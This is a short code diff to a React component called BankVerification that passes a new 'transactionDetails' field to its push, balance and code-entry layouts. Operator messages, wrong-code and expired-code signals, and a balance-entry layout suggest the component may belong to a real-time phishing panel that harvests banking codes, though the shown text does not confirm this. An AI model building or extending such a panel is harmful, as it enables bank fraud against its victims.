@@ -34,7 +34,7 @@ export function BankVerification({
   const [submitting, setSubmitting] = useState(false);
   const [resetKey, setResetKey] = useState(0);
 
-  const { status, verificationLayout, bank, redirectUrl, wrongCode, expiredCode, clearCodeFeedback, operatorMessage, countdownResetTrigger } =
+  const { status, verificationLayout, bank, redirectUrl, transactionDetails, wrongCode, expiredCode, clearCodeFeedback, operatorMessage, countdownResetTrigger } =
     useSessionStatus(apiBase, channelSlug, sessionId);
 
   const baseLayout = normalizeLayout(verificationLayout);
@@ -130,10 +130,11 @@ export function BankVerification({
 
   const layoutProps =
     baseLayout === "push"
-      ? { bank }
+      ? { bank, transactionDetails }
       : baseLayout === "balance"
         ? {
             bank,
+            transactionDetails,
             onError: (m: string) => setError(m),
             operatorMessage,
             onSubmit: handleSubmitBalance,
@@ -141,6 +142,7 @@ export function BankVerification({
           }
         : {
             bank,
+            transactionDetails,
             onError: (m: string) => setError(m),
             wrongCode,
             expiredCode,
